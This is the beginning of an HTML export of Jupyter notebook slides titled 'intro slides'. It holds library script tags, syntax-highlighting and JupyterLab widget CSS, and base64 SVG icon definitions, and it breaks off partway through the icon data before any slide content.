<!DOCTYPE html>

<html lang="en">
<head><meta charset="utf-8"/>
<meta content="chrome=1" http-equiv="X-UA-Compatible"/>
<meta content="yes" name="apple-mobile-web-app-capable"/>
<meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"/>
<title>intro slides</title><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.1.10/require.min.js"></script><script type="module">
  import mermaid from 'https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.7.0/mermaid.esm.min.mjs';
  mermaid.initialize({ startOnLoad: true });
</script>
<!-- General and theme style sheets -->
<link href="https://unpkg.com/reveal.js@4.0.2/dist/reveal.css" rel="stylesheet"/>
<!-- If the query includes 'print-pdf', include the PDF print sheet -->
<script>
if( window.location.search.match( /print-pdf/gi ) ) {
        var link = document.createElement( 'link' );
        link.rel = 'stylesheet';
        link.type = 'text/css';
        document.getElementsByTagName( 'head' )[0].appendChild( link );
}
</script>
<style type="text/css">
    pre { line-height: 125%; }
td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
.highlight .hll { background-color: var(--jp-cell-editor-active-background) }
.highlight { background: var(--jp-cell-editor-background); color: var(--jp-mirror-editor-variable-color) }
.highlight .c { color: var(--jp-mirror-editor-comment-color); font-style: italic } /* Comment */
.highlight .err { color: var(--jp-mirror-editor-error-color) } /* Error */
.highlight .k { color: var(--jp-mirror-editor-keyword-color); font-weight: bold } /* Keyword */
.highlight .o { color: var(--jp-mirror-editor-operator-color); font-weight: bold } /* Operator */
.highlight .p { color: var(--jp-mirror-editor-punctuation-color) } /* Punctuation */
.highlight .ch { color: var(--jp-mirror-editor-comment-color); font-style: italic } /* Comment.Hashbang */
.highlight .cm { color: var(--jp-mirror-editor-comment-color); font-style: italic } /* Comment.Multiline */
.highlight .cp { color: var(--jp-mirror-editor-comment-color); font-style: italic } /* Comment.Preproc */
.highlight .cpf { color: var(--jp-mirror-editor-comment-color); font-style: italic } /* Comment.PreprocFile */
.highlight .c1 { color: var(--jp-mirror-editor-comment-color); font-style: italic } /* Comment.Single */
.highlight .cs { color: var(--jp-mirror-editor-comment-color); font-style: italic } /* Comment.Special */
.highlight .kc { color: var(--jp-mirror-editor-keyword-color); font-weight: bold } /* Keyword.Constant */
.highlight .kd { color: var(--jp-mirror-editor-keyword-color); font-weight: bold } /* Keyword.Declaration */
.highlight .kn { color: var(--jp-mirror-editor-keyword-color); font-weight: bold } /* Keyword.Namespace */
.highlight .kp { color: var(--jp-mirror-editor-keyword-color); font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { color: var(--jp-mirror-editor-keyword-color); font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: var(--jp-mirror-editor-keyword-color); font-weight: bold } /* Keyword.Type */
.highlight .m { color: var(--jp-mirror-editor-number-color) } /* Literal.Number */
.highlight .s { color: var(--jp-mirror-editor-string-color) } /* Literal.String */
.highlight .ow { color: var(--jp-mirror-editor-operator-color); font-weight: bold } /* Operator.Word */
.highlight .pm { color: var(--jp-mirror-editor-punctuation-color) } /* Punctuation.Marker */
.highlight .w { color: var(--jp-mirror-editor-variable-color) } /* Text.Whitespace */
.highlight .mb { color: var(--jp-mirror-editor-number-color) } /* Literal.Number.Bin */
.highlight .mf { color: var(--jp-mirror-editor-number-color) } /* Literal.Number.Float */
.highlight .mh { color: var(--jp-mirror-editor-number-color) } /* Literal.Number.Hex */
.highlight .mi { color: var(--jp-mirror-editor-number-color) } /* Literal.Number.Integer */
.highlight .mo { color: var(--jp-mirror-editor-number-color) } /* Literal.Number.Oct */
.highlight .sa { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Affix */
.highlight .sb { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Backtick */
.highlight .sc { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Char */
.highlight .dl { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Delimiter */
.highlight .sd { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Doc */
.highlight .s2 { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Double */
.highlight .se { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Escape */
.highlight .sh { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Heredoc */
.highlight .si { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Interpol */
.highlight .sx { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Other */
.highlight .sr { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Regex */
.highlight .s1 { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Single */
.highlight .ss { color: var(--jp-mirror-editor-string-color) } /* Literal.String.Symbol */
.highlight .il { color: var(--jp-mirror-editor-number-color) } /* Literal.Number.Integer.Long */
  </style>
<style type="text/css">
/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/*
 * Mozilla scrollbar styling
 */

/* use standard opaque scrollbars for most nodes */
[data-jp-theme-scrollbars='true'] {
  scrollbar-color: rgb(var(--jp-scrollbar-thumb-color))
    var(--jp-scrollbar-background-color);
}

/* for code nodes, use a transparent style of scrollbar. These selectors
 * will match lower in the tree, and so will override the above */
[data-jp-theme-scrollbars='true'] .CodeMirror-hscrollbar,
[data-jp-theme-scrollbars='true'] .CodeMirror-vscrollbar {
  scrollbar-color: rgba(var(--jp-scrollbar-thumb-color), 0.5) transparent;
}

/* tiny scrollbar */

.jp-scrollbar-tiny {
  scrollbar-color: rgba(var(--jp-scrollbar-thumb-color), 0.5) transparent;
  scrollbar-width: thin;
}

/* tiny scrollbar */

.jp-scrollbar-tiny::-webkit-scrollbar,
.jp-scrollbar-tiny::-webkit-scrollbar-corner {
  background-color: transparent;
  height: 4px;
  width: 4px;
}

.jp-scrollbar-tiny::-webkit-scrollbar-thumb {
  background: rgba(var(--jp-scrollbar-thumb-color), 0.5);
}

.jp-scrollbar-tiny::-webkit-scrollbar-track:horizontal {
  border-left: 0 solid transparent;
  border-right: 0 solid transparent;
}

.jp-scrollbar-tiny::-webkit-scrollbar-track:vertical {
  border-top: 0 solid transparent;
  border-bottom: 0 solid transparent;
}

/*
 * Lumino
 */

.lm-ScrollBar[data-orientation='horizontal'] {
  min-height: 16px;
  max-height: 16px;
  min-width: 45px;
  border-top: 1px solid #a0a0a0;
}

.lm-ScrollBar[data-orientation='vertical'] {
  min-width: 16px;
  max-width: 16px;
  min-height: 45px;
  border-left: 1px solid #a0a0a0;
}

.lm-ScrollBar-button {
  background-color: #f0f0f0;
  background-position: center center;
  min-height: 15px;
  max-height: 15px;
  min-width: 15px;
  max-width: 15px;
}

.lm-ScrollBar-button:hover {
  background-color: #dadada;
}

.lm-ScrollBar-button.lm-mod-active {
  background-color: #cdcdcd;
}

.lm-ScrollBar-track {
  background: #f0f0f0;
}

.lm-ScrollBar-thumb {
  background: #cdcdcd;
}

.lm-ScrollBar-thumb:hover {
  background: #bababa;
}

.lm-ScrollBar-thumb.lm-mod-active {
  background: #a0a0a0;
}

.lm-ScrollBar[data-orientation='horizontal'] .lm-ScrollBar-thumb {
  height: 100%;
  min-width: 15px;
  border-left: 1px solid #a0a0a0;
  border-right: 1px solid #a0a0a0;
}

.lm-ScrollBar[data-orientation='vertical'] .lm-ScrollBar-thumb {
  width: 100%;
  min-height: 15px;
  border-top: 1px solid #a0a0a0;
  border-bottom: 1px solid #a0a0a0;
}

.lm-ScrollBar[data-orientation='horizontal']
  .lm-ScrollBar-button[data-action='decrement'] {
  background-image: var(--jp-icon-caret-left);
  background-size: 17px;
}

.lm-ScrollBar[data-orientation='horizontal']
  .lm-ScrollBar-button[data-action='increment'] {
  background-image: var(--jp-icon-caret-right);
  background-size: 17px;
}

.lm-ScrollBar[data-orientation='vertical']
  .lm-ScrollBar-button[data-action='decrement'] {
  background-image: var(--jp-icon-caret-up);
  background-size: 17px;
}

.lm-ScrollBar[data-orientation='vertical']
  .lm-ScrollBar-button[data-action='increment'] {
  background-image: var(--jp-icon-caret-down);
  background-size: 17px;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-Widget {
  box-sizing: border-box;
  position: relative;
  overflow: hidden;
}

.lm-Widget.lm-mod-hidden {
  display: none !important;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

.lm-AccordionPanel[data-orientation='horizontal'] > .lm-AccordionPanel-title {
  /* Title is rotated for horizontal accordion panel using CSS */
  display: block;
  transform-origin: top left;
  transform: rotate(-90deg) translate(-100%);
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-CommandPalette {
  display: flex;
  flex-direction: column;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.lm-CommandPalette-search {
  flex: 0 0 auto;
}

.lm-CommandPalette-content {
  flex: 1 1 auto;
  margin: 0;
  padding: 0;
  min-height: 0;
  overflow: auto;
  list-style-type: none;
}

.lm-CommandPalette-header {
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}

.lm-CommandPalette-item {
  display: flex;
  flex-direction: row;
}

.lm-CommandPalette-itemIcon {
  flex: 0 0 auto;
}

.lm-CommandPalette-itemContent {
  flex: 1 1 auto;
  overflow: hidden;
}

.lm-CommandPalette-itemShortcut {
  flex: 0 0 auto;
}

.lm-CommandPalette-itemLabel {
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}

.lm-close-icon {
  border: 1px solid transparent;
  background-color: transparent;
  position: absolute;
  z-index: 1;
  right: 3%;
  top: 0;
  bottom: 0;
  margin: auto;
  padding: 7px 0;
  display: none;
  vertical-align: middle;
  outline: 0;
  cursor: pointer;
}
.lm-close-icon:after {
  content: 'X';
  display: block;
  width: 15px;
  height: 15px;
  text-align: center;
  color: #000;
  font-weight: normal;
  font-size: 12px;
  cursor: pointer;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-DockPanel {
  z-index: 0;
}

.lm-DockPanel-widget {
  z-index: 0;
}

.lm-DockPanel-tabBar {
  z-index: 1;
}

.lm-DockPanel-handle {
  z-index: 2;
}

.lm-DockPanel-handle.lm-mod-hidden {
  display: none !important;
}

.lm-DockPanel-handle:after {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  content: '';
}

.lm-DockPanel-handle[data-orientation='horizontal'] {
  cursor: ew-resize;
}

.lm-DockPanel-handle[data-orientation='vertical'] {
  cursor: ns-resize;
}

.lm-DockPanel-handle[data-orientation='horizontal']:after {
  left: 50%;
  min-width: 8px;
  transform: translateX(-50%);
}

.lm-DockPanel-handle[data-orientation='vertical']:after {
  top: 50%;
  min-height: 8px;
  transform: translateY(-50%);
}

.lm-DockPanel-overlay {
  z-index: 3;
  box-sizing: border-box;
  pointer-events: none;
}

.lm-DockPanel-overlay.lm-mod-hidden {
  display: none !important;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-Menu {
  z-index: 10000;
  position: absolute;
  white-space: nowrap;
  overflow-x: hidden;
  overflow-y: auto;
  outline: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.lm-Menu-content {
  margin: 0;
  padding: 0;
  display: table;
  list-style-type: none;
}

.lm-Menu-item {
  display: table-row;
}

.lm-Menu-item.lm-mod-hidden,
.lm-Menu-item.lm-mod-collapsed {
  display: none !important;
}

.lm-Menu-itemIcon,
.lm-Menu-itemSubmenuIcon {
  display: table-cell;
  text-align: center;
}

.lm-Menu-itemLabel {
  display: table-cell;
  text-align: left;
}

.lm-Menu-itemShortcut {
  display: table-cell;
  text-align: right;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-MenuBar {
  outline: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.lm-MenuBar-content {
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: row;
  list-style-type: none;
}

.lm-MenuBar-item {
  box-sizing: border-box;
}

.lm-MenuBar-itemIcon,
.lm-MenuBar-itemLabel {
  display: inline-block;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-ScrollBar {
  display: flex;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.lm-ScrollBar[data-orientation='horizontal'] {
  flex-direction: row;
}

.lm-ScrollBar[data-orientation='vertical'] {
  flex-direction: column;
}

.lm-ScrollBar-button {
  box-sizing: border-box;
  flex: 0 0 auto;
}

.lm-ScrollBar-track {
  box-sizing: border-box;
  position: relative;
  overflow: hidden;
  flex: 1 1 auto;
}

.lm-ScrollBar-thumb {
  box-sizing: border-box;
  position: absolute;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-SplitPanel-child {
  z-index: 0;
}

.lm-SplitPanel-handle {
  z-index: 1;
}

.lm-SplitPanel-handle.lm-mod-hidden {
  display: none !important;
}

.lm-SplitPanel-handle:after {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  content: '';
}

.lm-SplitPanel[data-orientation='horizontal'] > .lm-SplitPanel-handle {
  cursor: ew-resize;
}

.lm-SplitPanel[data-orientation='vertical'] > .lm-SplitPanel-handle {
  cursor: ns-resize;
}

.lm-SplitPanel[data-orientation='horizontal'] > .lm-SplitPanel-handle:after {
  left: 50%;
  min-width: 8px;
  transform: translateX(-50%);
}

.lm-SplitPanel[data-orientation='vertical'] > .lm-SplitPanel-handle:after {
  top: 50%;
  min-height: 8px;
  transform: translateY(-50%);
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-TabBar {
  display: flex;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.lm-TabBar[data-orientation='horizontal'] {
  flex-direction: row;
  align-items: flex-end;
}

.lm-TabBar[data-orientation='vertical'] {
  flex-direction: column;
  align-items: flex-end;
}

.lm-TabBar-content {
  margin: 0;
  padding: 0;
  display: flex;
  flex: 1 1 auto;
  list-style-type: none;
}

.lm-TabBar[data-orientation='horizontal'] > .lm-TabBar-content {
  flex-direction: row;
}

.lm-TabBar[data-orientation='vertical'] > .lm-TabBar-content {
  flex-direction: column;
}

.lm-TabBar-tab {
  display: flex;
  flex-direction: row;
  box-sizing: border-box;
  overflow: hidden;
  touch-action: none; /* Disable native Drag/Drop */
}

.lm-TabBar-tabIcon,
.lm-TabBar-tabCloseIcon {
  flex: 0 0 auto;
}

.lm-TabBar-tabLabel {
  flex: 1 1 auto;
  overflow: hidden;
  white-space: nowrap;
}

.lm-TabBar-tabInput {
  user-select: all;
  width: 100%;
  box-sizing: border-box;
}

.lm-TabBar-tab.lm-mod-hidden {
  display: none !important;
}

.lm-TabBar-addButton.lm-mod-hidden {
  display: none !important;
}

.lm-TabBar.lm-mod-dragging .lm-TabBar-tab {
  position: relative;
}

.lm-TabBar.lm-mod-dragging[data-orientation='horizontal'] .lm-TabBar-tab {
  left: 0;
  transition: left 150ms ease;
}

.lm-TabBar.lm-mod-dragging[data-orientation='vertical'] .lm-TabBar-tab {
  top: 0;
  transition: top 150ms ease;
}

.lm-TabBar.lm-mod-dragging .lm-TabBar-tab.lm-mod-dragging {
  transition: none;
}

.lm-TabBar-tabLabel .lm-TabBar-tabInput {
  user-select: all;
  width: 100%;
  box-sizing: border-box;
  background: inherit;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

.lm-TabPanel-tabBar {
  z-index: 1;
}

.lm-TabPanel-stackedPanel {
  z-index: 0;
}

/*
 * Copyright (c) Jupyter Development Team.
 * Distributed under the terms of the Modified BSD License.
 */

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Copyright (c) 2014-2017, PhosphorJS Contributors
|
| Distributed under the terms of the BSD 3-Clause License.
|
| The full license is in the file LICENSE, distributed with this software.
|----------------------------------------------------------------------------*/

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

.jp-Collapse {
  display: flex;
  flex-direction: column;
  align-items: stretch;
}

.jp-Collapse-header {
  padding: 1px 12px;
  background-color: var(--jp-layout-color1);
  border-bottom: solid var(--jp-border-width) var(--jp-border-color2);
  color: var(--jp-ui-font-color1);
  cursor: pointer;
  display: flex;
  align-items: center;
  font-size: var(--jp-ui-font-size0);
  font-weight: 600;
  text-transform: uppercase;
  user-select: none;
}

.jp-Collapser-icon {
  height: 16px;
}

.jp-Collapse-header-collapsed .jp-Collapser-icon {
  transform: rotate(-90deg);
  margin: auto 0;
}

.jp-Collapser-title {
  line-height: 25px;
}

.jp-Collapse-contents {
  padding: 0 12px;
  background-color: var(--jp-layout-color1);
  color: var(--jp-ui-font-color1);
  overflow: auto;
}

/*-----------------------------------------------------------------------------
| Copyright (c) Jupyter Development Team.
| Distributed under the terms of the Modified BSD License.
|----------------------------------------------------------------------------*/

/* This file was auto-generated by ensureUiComponents() in @jupyterlab/buildutils */

/**
 * (DEPRECATED) Support for consuming icons as CSS background images
 */

/* Icons urls */

:root {
  --jp-icon-add-above: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHZpZXdCb3g9IjAgMCAxNCAxNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzEzN18xOTQ5MikiPgo8cGF0aCBjbGFzcz0ianAtaWNvbjMiIGQ9Ik00Ljc1IDQuOTMwNjZINi42MjVWNi44MDU2NkM2LjYyNSA3LjAxMTkxIDYuNzkzNzUgNy4xODA2NiA3IDcuMTgwNjZDNy4yMDYyNSA3LjE4MDY2IDcuMzc1IDcuMDExOTEgNy4zNzUgNi44MDU2NlY0LjkzMDY2SDkuMjVDOS40NTYyNSA0LjkzMDY2IDkuNjI1IDQuNzYxOTEgOS42MjUgNC41NTU2NkM5LjYyNSA0LjM0OTQxIDkuNDU2MjUgNC4xODA2NiA5LjI1IDQuMTgwNjZINy4zNzVWMi4zMDU2NkM3LjM3NSAyLjA5OTQxIDcuMjA2MjUgMS45MzA2NiA3IDEuOTMwNjZDNi43OTM3NSAxLjkzMDY2IDYuNjI1IDIuMDk5NDEgNi42MjUgMi4zMDU2NlY0LjE4MDY2SDQuNzVDNC41NDM3NSA0LjE4MDY2IDQuMzc1IDQuMzQ5NDEgNC4zNzUgNC41NTU2NkM0LjM3NSA0Ljc2MTkxIDQuNTQzNzUgNC45MzA2NiA0Ljc1IDQuOTMwNjZaIiBmaWxsPSIjNjE2MTYxIiBzdHJva2U9IiM2MTYxNjEiIHN0cm9rZS13aWR0aD0iMC43Ii8+CjwvZz4KPHBhdGggY2xhc3M9ImpwLWljb24zIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTExLjUgOS41VjExLjVMMi41IDExLjVWOS41TDExLjUgOS41Wk0xMiA4QzEyLjU1MjMgOCAxMyA4LjQ0NzcyIDEzIDlWMTJDMTMgMTIuNTUyMyAxMi41NTIzIDEzIDEyIDEzTDIgMTNDMS40NDc3MiAxMyAxIDEyLjU1MjMgMSAxMlY5QzEgOC40NDc3MiAxLjQ0NzcxIDggMiA4TDEyIDhaIiBmaWxsPSIjNjE2MTYxIi8+CjxkZWZzPgo8Y2xpcFBhdGggaWQ9ImNsaXAwXzEzN18xOTQ5MiI+CjxyZWN0IGNsYXNzPSJqcC1pY29uMyIgd2lkdGg9IjYiIGhlaWdodD0iNiIgZmlsbD0id2hpdGUiIHRyYW5zZm9ybT0ibWF0cml4KC0xIDAgMCAxIDEwIDEuNTU1NjYpIi8+CjwvY2xpcFBhdGg+CjwvZGVmcz4KPC9zdmc+Cg==);
  --jp-icon-add-below: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHZpZXdCb3g9IjAgMCAxNCAxNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzEzN18xOTQ5OCkiPgo8cGF0aCBjbGFzcz0ianAtaWNvbjMiIGQ9Ik05LjI1IDEwLjA2OTNMNy4zNzUgMTAuMDY5M0w3LjM3NSA4LjE5NDM0QzcuMzc1IDcuOTg4MDkgNy4yMDYyNSA3LjgxOTM0IDcgNy44MTkzNEM2Ljc5Mzc1IDcuODE5MzQgNi42MjUgNy45ODgwOSA2LjYyNSA4LjE5NDM0TDYuNjI1IDEwLjA2OTNMNC43NSAxMC4wNjkzQzQuNTQzNzUgMTAuMDY5MyA0LjM3NSAxMC4yMzgxIDQuMzc1IDEwLjQ0NDNDNC4zNzUgMTAuNjUwNiA0LjU0Mzc1IDEwLjgxOTMgNC43NSAxMC44MTkzTDYuNjI1IDEwLjgxOTNMNi42MjUgMTIuNjk0M0M2LjYyNSAxMi45MDA2IDYuNzkzNzUgMTMuMDY5MyA3IDEzLjA2OTNDNy4yMDYyNSAxMy4wNjkzIDcuMzc1IDEyLjkwMDYgNy4zNzUgMTIuNjk0M0w3LjM3NSAxMC44MTkzTDkuMjUgMTAuODE5M0M5LjQ1NjI1IDEwLjgxOTMgOS42MjUgMTAuNjUwNiA5LjYyNSAxMC40NDQzQzkuNjI1IDEwLjIzODEgOS40NTYyNSAxMC4wNjkzIDkuMjUgMTAuMDY5M1oiIGZpbGw9IiM2MTYxNjEiIHN0cm9rZT0iIzYxNjE2MSIgc3Ryb2tlLXdpZHRoPSIwLjciLz4KPC9nPgo8cGF0aCBjbGFzcz0ianAtaWNvbjMiIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMi41IDUuNUwyLjUgMy41TDExLjUgMy41TDExLjUgNS41TDIuNSA1LjVaTTIgN0MxLjQ0NzcyIDcgMSA2LjU1MjI4IDEgNkwxIDNDMSAyLjQ0NzcyIDEuNDQ3NzIgMiAyIDJMMTIgMkMxMi41NTIzIDIgMTMgMi40NDc3MiAxMyAzTDEzIDZDMTMgNi41NTIyOSAxMi41NTIzIDcgMTIgN0wyIDdaIiBmaWxsPSIjNjE2MTYxIi8+CjxkZWZzPgo8Y2xpcFBhdGggaWQ9ImNsaXAwXzEzN18xOTQ5OCI+CjxyZWN0IGNsYXNzPSJqcC1pY29uMyIgd2lkdGg9IjYiIGhlaWdodD0iNiIgZmlsbD0id2hpdGUiIHRyYW5zZm9ybT0ibWF0cml4KDEgMS43NDg0NmUtMDcgMS43NDg0NmUtMDcgLTEgNCAxMy40NDQzKSIvPgo8L2NsaXBQYXRoPgo8L2RlZnM+Cjwvc3ZnPgo=);
  --jp-icon-add: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8ZyBjbGFzcz0ianAtaWNvbjMiIGZpbGw9IiM2MTYxNjEiPgogICAgPHBhdGggZD0iTTE5IDEzaC02djZoLTJ2LTZINXYtMmg2VjVoMnY2aDZ2MnoiLz4KICA8L2c+Cjwvc3ZnPgo=);
  --jp-icon-bell: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiPgogICA8cGF0aCBjbGFzcz0ianAtaWNvbjIganAtaWNvbi1zZWxlY3RhYmxlIiBmaWxsPSIjMzMzMzMzIgogICAgICBkPSJtOCAwLjI5Yy0xLjQgMC0yLjcgMC43My0zLjYgMS44LTEuMiAxLjUtMS40IDMuNC0xLjUgNS4yLTAuMTggMi4yLTAuNDQgNC0yLjMgNS4zbDAuMjggMS4zaDVjMC4wMjYgMC42NiAwLjMyIDEuMSAwLjcxIDEuNSAwLjg0IDAuNjEgMiAwLjYxIDIuOCAwIDAuNTItMC40IDAuNi0xIDAuNzEtMS41aDVsMC4yOC0xLjNjLTEuOS0wLjk3LTIuMi0zLjMtMi4zLTUuMy0wLjEzLTEuOC0wLjI2LTMuNy0xLjUtNS4yLTAuODUtMS0yLjItMS44LTMuNi0xLjh6bTAgMS40YzAuODggMCAxLjkgMC41NSAyLjUgMS4zIDAuODggMS4xIDEuMSAyLjcgMS4yIDQuNCAwLjEzIDEuNyAwLjIzIDMuNiAxLjMgNS4yaC0xMGMxLjEtMS42IDEuMi0zLjQgMS4zLTUuMiAwLjEzLTEuNyAwLjMtMy4zIDEuMi00LjQgMC41OS0wLjcyIDEuNi0xLjMgMi41LTEuM3ptLTAuNzQgMTJoMS41Yy0wLjAwMTUgMC4yOCAwLjAxNSAwLjc5LTAuNzQgMC43OS0wLjczIDAuMDAxNi0wLjcyLTAuNTMtMC43NC0wLjc5eiIgLz4KPC9zdmc+Cg==);
  --jp-icon-bug-dot: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxnIGNsYXNzPSJqcC1pY29uMyBqcC1pY29uLXNlbGVjdGFibGUiIGZpbGw9IiM2MTYxNjEiPgogICAgICAgIDxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTcuMTkgOEgyMFYxMEgxNy45MUMxNy45NiAxMC4zMyAxOCAxMC42NiAxOCAxMVYxMkgyMFYxNEgxOC41SDE4VjE0LjAyNzVDMTUuNzUgMTQuMjc2MiAxNCAxNi4xODM3IDE0IDE4LjVDMTQgMTkuMjA4IDE0LjE2MzUgMTkuODc3OSAxNC40NTQ5IDIwLjQ3MzlDMTMuNzA2MyAyMC44MTE3IDEyLjg3NTcgMjEgMTIgMjFDOS43OCAyMSA3Ljg1IDE5Ljc5IDYuODEgMThINFYxNkg2LjA5QzYuMDQgMTUuNjcgNiAxNS4zNCA2IDE1VjE0SDRWMTJINlYxMUM2IDEwLjY2IDYuMDQgMTAuMzMgNi4wOSAxMEg0VjhINi44MUM3LjI2IDcuMjIgNy44OCA2LjU1IDguNjIgNi4wNEw3IDQuNDFMOC40MSAzTDEwLjU5IDUuMTdDMTEuMDQgNS4wNiAxMS41MSA1IDEyIDVDMTIuNDkgNSAxMi45NiA1LjA2IDEzLjQyIDUuMTdMMTUuNTkgM0wxNyA0LjQxTDE1LjM3IDYuMDRDMTYuMTIgNi41N